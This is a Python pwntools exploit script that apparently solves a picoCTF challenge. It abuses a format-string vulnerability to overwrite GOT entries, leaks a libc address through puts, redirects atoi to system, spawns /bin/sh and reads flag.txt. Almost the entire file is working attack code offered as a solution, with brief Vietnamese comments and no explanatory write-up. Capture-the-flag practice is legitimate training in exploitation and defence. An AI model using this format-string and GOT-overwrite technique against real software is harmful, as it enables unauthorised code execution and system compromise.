#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall", checksec=False)
context.binary = exe

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        	b* 0x00000000004009D2
        	b* 0x0000000000400947
        	b* 0x00000000004008D2
            c
            set follow-fork-mode parent
            ''')
            
if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("mars.picoctf.net", 31929)

# Overwrite pow -> main
# Note: atoi: neu ki tu dau tien ko phai so -> error
# Note: khi snprintf gap null byte thi se dung ngay lap tuc
payload = flat(b'5'.ljust(8, b'a'), exe.got.pow)
p.sendafter(b'A: ', payload)
payload = flat(
	b'5'.ljust(8, b'a'),
	f'%{(exe.sym.main - 46) & 0xffff}c%11$hn'.encode(),
	)
p.sendafter(b'B: ', payload)

# Leak libc
payload = flat(
	b'5'.ljust(8, b'a'),
	exe.got.puts
	)
p.sendafter(b'A: ', payload)
payload = flat(
	b'5'.ljust(8, b'a'),
	b'%11$s'
	)
# GDB()
p.sendafter(b'B: ', payload)

p.recvuntil(b'and B: 5aaaaaaa')
libc_leak = u64(p.recv(6) + b'\0'*2)
print("Libc leak: " + hex(libc_leak))
offset_puts = 0x0875a0
libc_base = libc_leak - offset_puts
print("Libc base: " + hex(libc_base))

# Overwrite atoi -> system: libc_base + 0x50d70
offset_system = 0x055410
package = {
	((libc_base + offset_system) & 0xffff) - 46: exe.got.atoi,
	((libc_base + offset_system) >> 16 & 0xffff) - 46: exe.got.atoi + 2,
}
order = sorted(package)

payload = flat(b'5'.ljust(8, b'a'),
	package[order[0]],
	package[order[1]]
	)
p.sendafter(b'A: ', payload)
payload = flat(
	b'5'.ljust(8, b'a'),
	f'%{order[0]}c%11$hn'.encode(),
	f'%{order[1] - order[0]}c%12$hn'.encode(),
	)
# GDB()
p.sendafter(b'B: ', payload)

p.sendafter(b'A: ', b'/bin/sh\0')
p.sendafter(b'B: ', b'\0')
p.sendafter(b'B: ', b'\0')
p.sendline(b'cat flag.txt')

p.interactive()